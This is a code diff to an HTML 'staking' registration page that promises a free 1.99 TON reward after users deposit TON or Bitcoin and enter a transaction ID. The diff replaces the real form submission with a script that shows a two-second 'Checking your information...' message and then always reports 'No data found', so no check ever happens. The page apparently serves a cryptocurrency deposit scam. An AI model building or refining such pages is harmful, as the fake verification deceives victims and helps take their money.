@@ -188,20 +188,27 @@
             width: 100%;
             z-index: 1000;
         }
+
+        /* For the checking and result message */
+        .checking-message, .result-message {
+            font-size: 1.5em;
+            color: #f39c12;
+            display: none;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
     <!-- New message for depositing via BTC -->
     <div class="top-message">
-        <a href="BTC.html">CONTINUE  WITH BITCOIN (BTC)</a>
+        <a href="BTC.html">CONTINUE WITH BITCOIN (BTC)</a>
     </div>
 
     <h1>Register - Start Staking</h1>
     <h2>Get your free reward of 1.99 TON</h2>
     <div class="container">
         <div class="qr-section">
-            
             <h2 class="section-title">Step 1: Deposit TON</h2>
             <h3>Now you can also deposit via BTC. </h3>
             <div class="section-content">
@@ -219,7 +226,7 @@
 
         <div class="input-group">
             <h2 class="section-title">Step 2: Enter Your Details</h2>
-            <form action="submit_registration.php" method="post">
+            <form id="registrationForm">
                 <div class="input-group">
                     <label for="userID">Your ID (After Transaction):</label>
                     <input type="text" id="userID" name="userID" required>
@@ -235,6 +242,9 @@
                 <input type="submit" value="Submit">
             </form>
         </div>
+
+        <div class="checking-message" id="checkingMessage">Checking your information...</div>
+        <div class="result-message" id="resultMessage">No data found. Please check your transaction ID.</div>
 
         <div class="trustworthiness">
             <h3>Still Need Help?</h3>
@@ -258,6 +268,23 @@
                 console.error("Error copying text: ", error);
             });
         }
+
+        // Function to handle form submission
+        document.getElementById("registrationForm").addEventListener("submit", function(e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Show checking message
+            document.getElementById("checkingMessage").style.display = "block";
+
+            // Wait for 2 seconds before showing the result
+            setTimeout(function() {
+                // Hide the checking message
+                document.getElementById("checkingMessage").style.display = "none";
+
+                // Show the result message
+                document.getElementById("resultMessage").style.display = "block";
+            }, 2000);
+        });
     </script>
 
 </body>
